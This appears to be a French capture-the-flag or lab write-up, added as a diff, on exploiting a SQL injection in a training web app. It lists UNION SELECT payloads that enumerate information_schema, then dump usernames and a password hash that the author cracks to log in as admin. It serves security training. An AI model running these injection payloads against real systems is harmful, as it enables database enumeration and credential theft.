@@ -1,0 +1,67 @@
+Celui-là vient à la suite du 08. On va chercher s’il n’existe pas d’autres schémas avec d’autres tables
+
+1 union select schema_name, 2 from information_schema.schemata 
+
+ID: 1 union select schema_name, 2 from information_schema.schemata  
+First name: one
+Surname : me
+
+ID: 1 union select schema_name, 2 from information_schema.schemata  
+First name: information_schema
+Surname : 2
+
+ID: 1 union select schema_name, 2 from information_schema.schemata  
+First name: Member_Brute_Force
+Surname : 2
+
+ID: 1 union select schema_name, 2 from information_schema.schemata  
+First name: Member_Sql_Injection
+Surname : 2
+
+ID: 1 union select schema_name, 2 from information_schema.schemata  
+First name: Member_guestbook
+Surname : 2
+
+ID: 1 union select schema_name, 2 from information_schema.schemata  
+First name: Member_images
+Surname : 2
+
+ID: 1 union select schema_name, 2 from information_schema.schemata  
+First name: Member_survey
+Surname : 2
+
+On va afficher chaque schéma.
+
+1 union SELECT table_schema, table_name FROM information_schema.tables
+
+Voici un résumé : 
+
+information_schema : CHARACTER_SETS, CLIENT_STATISTICS, COLLATIONS, COLLATION_CHARACTER_SET_APPLICABILITY, COLUMNS, COLUMN_PRIVILEGES, ENGINES, EVENTS, FILES, GLOBAL_STATUS, GLOBAL_VARIABLES, INDEX_STATISTICS, KEY_CACHES, KEY_COLUMN_USAGE, PARAMETERS, PARTITIONS, PLUGINS, PROCESSLIST, PROFILING, REFERENTIAL_CONSTRAINTS, ROUTINES, SCHEMATA, SCHEMA_PRIVILEGES, SESSION_STATUS, SESSION_VARIABLES, STATISTICS, TABLES, TABLESPACES, TABLE_CONSTRAINTS, TABLE_PRIVILEGES, TABLE_STATISTICS, TRIGGERS, USER_PRIVILEGES, USER_STATISTICS, VIEWS, INNODB_CMPMEM_RESET, INNODB_RSEG, INNODB_UNDO_LOGS, INNODB_CMPMEM, INNODB_SYS_TABLESTATS, INNODB_LOCK_WAITS, INNODB_INDEX_STATS, INNODB_CMP, INNODB_CMP_RESET, INNODB_CHANGED_PAGES, INNODB_BUFFER_POOL_PAGES, INNODB_TRX, INNODB_BUFFER_POOL_PAGES_INDEX, INNODB_LOCKS, INNODB_BUFFER_POOL_PAGES_BLOB, INNODB_SYS_TABLES, INNODB_SYS_FIELDS, INNODB_SYS_COLUMNS, INNODB_SYS_STATS, QUERY_CACHE_INFO, INNODB_SYS_INDEXES, XTRADB_ADMIN_COMMAND, INNODB_TABLE_STATS, INNODB_SYS_FOREIGN_COLS, INNODB_BUFFER_PAGE_LRU, INNODB_BUFFER_POOL_STATS, INNODB_BUFFER_PAGE, INNODB_SYS_FOREIGN
+Member_Brute_Force: db_default 
+Member_Sql_Injection: users 
+Member_guestbook: guestbook 
+Member_images: list_images
+Member_survey: vote_dbs
+
+
+Pour trouver toutes les colonnes liées aux tables (voir le fichier table.txt)
+
+1 union SELECT table_name, column_name FROM information_schema.columns
+
+Pour être honnête, je n'ai pas cherché dans toute la DB, j'ai fait au plus logique, c'est-à-dire chercher dans la table : Member_Brute_Force.db_default
+
+1 union select username, password from Member_Brute_Force.db_default
+
+ID: 1 union select username, password from Member_Brute_Force.db_default 
+First name: root
+Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
+
+ID: 1 union select username, password from Member_Brute_Force.db_default 
+First name: admin
+Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
+
+Une fois décrypté, ça nous donne : shadow
+
+une fois dans la page signin reste plus qu'a taper le mdp shadow et le nom admin ou root
+
+Pour régler le problème, suis les recommandations dans le 08.
